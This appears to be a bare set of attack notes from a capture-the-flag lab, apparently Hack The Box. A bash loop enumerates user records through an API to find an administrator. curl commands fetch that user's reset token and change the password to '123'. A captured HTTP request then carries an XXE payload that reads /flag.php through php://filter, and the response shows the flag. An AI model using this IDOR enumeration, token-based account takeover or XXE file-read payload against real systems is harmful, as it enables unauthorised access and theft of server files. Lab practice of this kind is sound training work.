for uid in {1..100}; do curl -s "http://94.237.55.43:50149/api.php/user/$uid"; echo; done | grep -i "admin"  
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}


curl -v -X GET "http://94.237.55.43:50149/reset.php?uid=52&token=$ADMIN_TOKEN&password=123"
  
  ADMIN_TOKEN=$(curl -s "http://94.237.55.43:50149/api.php/token/52" | jq -r .token)
echo "Admin Token: $ADMIN_TOKEN"

ID :a.corrales
PW : 123
CHANGED



GET /addEvent.php HTTP/1.1
Host: 94.237.55.43:50149
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: uid=52; PHPSESSID=bocot3db837kihk7djlhfc3vr2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 135

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php" >
]>
<root>
<name>&xxe;</name>
</root>




HTTP/1.1 200 OK
Date: Wed, 25 Jun 2025 03:39:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 86
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Event 'htb{123}' has been created.
